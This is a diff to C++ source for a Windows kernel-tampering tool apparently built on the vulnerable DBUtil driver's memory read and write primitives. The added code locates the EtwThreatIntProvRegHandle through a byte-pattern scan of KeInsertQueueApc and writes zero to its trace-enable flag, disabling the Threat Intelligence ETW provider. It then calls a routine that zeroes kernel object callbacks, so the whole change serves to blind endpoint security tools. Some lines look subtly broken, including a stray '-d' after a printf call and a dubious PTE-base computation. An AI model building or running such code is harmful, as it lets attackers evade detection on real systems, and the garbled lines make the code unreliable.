@@ -605,35 +605,6 @@ void EnumAllObjectsCallbacks(DBUTIL* ExploitManager, DWORD64 ntoskrnlBaseAddress
 		printf("Callback Status: 0x%llx\n", *buffer);-d
 		unsigned long long writeBuffer = 0x00000000;
 		ExploitManager->WriteMemory(obStatus, &writeBuffer, 4);
-		
-		//OB_CALLBACK_ENTRY* test = (OB_CALLBACK_ENTRY*)ObjectType_Callbacks_List;
-		//printf("Callback list: 0xllx\n", test->CallbackList);
-		//printf("Enabled flag: %d\n", test->Enabled);
-		/*ExploitManager->ReadMemory(ObjectType_Callbacks_List, &buffer, 8);
-		ObjectType_Callbacks_List = *buffer;
-		printf("ListEntry at: 0x%llx\n", ObjectType_Callbacks_List);
-		ExploitManager->ReadMemory(ObjectType_Callbacks_List + Offset_CALLBACK_ENTRY_ITEM_Enabled, &buffer, 8);
-		uint8_t enabledFlag = *buffer;
-		printf("Read buffer value: 0x%llx\n", *buffer);
-		printf("Enabled Flag: 0x%llx\n", enabledFlag);
-		if (enabledFlag != 0x1) {
-			printf("Skip disabled flag\n");
-			continue;
-		}*/
-		/*printf("Callback Object Type at: 0x%llx\n", *buffer + Offset_CALLBACK_ENTRY_ITEM_ObjectType);
-		ExploitManager->ReadMemory(ObjectType_Callbacks_List + Offset_CALLBACK_ENTRY_ITEM_Operations, &buffer, 8);
-		uint8_t cbOperationType = *buffer;
-		printf("Operation Type: %ld\n", cbOperationType);
-		printf("Operation Type: 0x%llx\n", ObjectType_Callbacks_List + Offset_CALLBACK_ENTRY_ITEM_Operations);
-		printf("Pre Operation at: 0x%llx\n", ObjectType_Callbacks_List + Offset_CALLBACK_ENTRY_ITEM_PreOperation);
-		printf("Post Operation at: 0x%llx\n", ObjectType_Callbacks_List + Offset_CALLBACK_ENTRY_ITEM_PostOperation);
-		printf("Object Type Callbacks at: 0x%llx\n", *buffer);
-		printf("cb POBJECT_TYPE Offset 0x%llx\n", Offset_CALLBACK_ENTRY_ITEM_ObjectType);
-		printf("cb operation Offset 0x%llx\n", Offset_CALLBACK_ENTRY_ITEM_Operations);
-		printf("cb pre operation Offset 0x%llx\n", Offset_CALLBACK_ENTRY_ITEM_PreOperation);
-		printf("cb post operation Offset 0x%llx\n", Offset_CALLBACK_ENTRY_ITEM_PostOperation);
-		printf("cb enabled Offset 0x%llx\n", Offset_CALLBACK_ENTRY_ITEM_Enabled);*/
-		printf("bp\n");
 	}
 
 	getchar();
@@ -644,9 +615,57 @@ void EnumAllObjectsCallbacks(DBUTIL* ExploitManager, DWORD64 ntoskrnlBaseAddress
 int main() {
 
 	DBUTIL* ExploitManager = new DBUTIL();
-	// Get ntoskrnl.exe base address
 	DWORD64 ntoskrnlBaseAddress = ExploitManager->GetKernelBase("ntoskrnl.exe");
 	printf("[+] Base address of ntoskrnl.exe: 0x%llx\n", ntoskrnlBaseAddress);
+	
+	// Disable EtwThreatIntProcHandle Trace Flag
+	unsigned long long ntMiGetPTEAddress = ntoskrnlBaseAddress + 0xffff88f8f5c00000;
+	printf("[+] Base of the PTEs: 0x%llx\n", ntMiGetPTEAddress);
+	HMODULE Ntoskrnl = LoadLibraryExA("Ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
+	if (Ntoskrnl == NULL) {
+		printf("[!] Unable to load Ntoskrnl.exe: %lu\n", GetLastError());
+		return 0;
+	}
+
+	LPVOID pSymbol = GetProcAddress(Ntoskrnl, "KeInsertQueueApc");
+	if (pSymbol == NULL) {
+		printf("[!] Unable to find address of exported KeInsertQueueApc: %lu\n", GetLastError());
+		return 0;
+	}
+	DWORD distance = 0;
+	for (int i = 0; i < 100; i++) {
+		if ((((PBYTE)pSymbol)[i] == 0x48) && (((PBYTE)pSymbol)[i + 1] == 0x8B) && (((PBYTE)pSymbol)[i + 2] == 0x0D)) {
+			distance = *(PDWORD)((DWORD_PTR)pSymbol + i + 3);
+			pSymbol = (LPVOID)((DWORD_PTR)pSymbol + i + distance + 7);
+			break;
+		}
+	}
+	DWORD_PTR symbolOffset = (DWORD)pSymbol - (DWORD)Ntoskrnl;
+	unsigned long long ntEtwThreatIntProvRegHandleAddress = ntoskrnlBaseAddress + symbolOffset;
+	unsigned long long buffer[16];
+	ExploitManager->VirtualRead(ntEtwThreatIntProvRegHandleAddress, &buffer, 8);
+	ExploitManager->VirtualRead(*buffer + 0x20, &buffer, 8);
+	unsigned long long traceEnableAddress = *buffer + 0x60;
+	ExploitManager->VirtualRead(*buffer + 0x60, &buffer, 8);
+	printf("[+] TraceEnableAddress: 0x%llx\n", traceEnableAddress);
+	printf("[+] TraceEnableStatus: 0x%llx\n", *buffer);
+
+	TCHAR file[MAX_PATH];
+	GetModuleFileNameA(NULL, file, _countof(file));
+	std::string fileStr(file);
+	int pos = fileStr.find_last_of("\\");
+	std::string processName = fileStr.substr(pos + 1);
+	std::string outputPath = fileStr.substr(0, pos);
+	printf("Current process name: %s\n", processName.c_str());
+	
+	unsigned long long enable[2];
+	unsigned long long disable[2];
+	enable[0] = 1; enable[1] = 0;
+	disable[0] = 0; disable[1] = 0;
+	
+	ExploitManager->VirtualWrite(traceEnableAddress, disable, 8);
+	
+	// Disable Callbacks
 	EnumAllObjectsCallbacks(ExploitManager, ntoskrnlBaseAddress);
 
 }
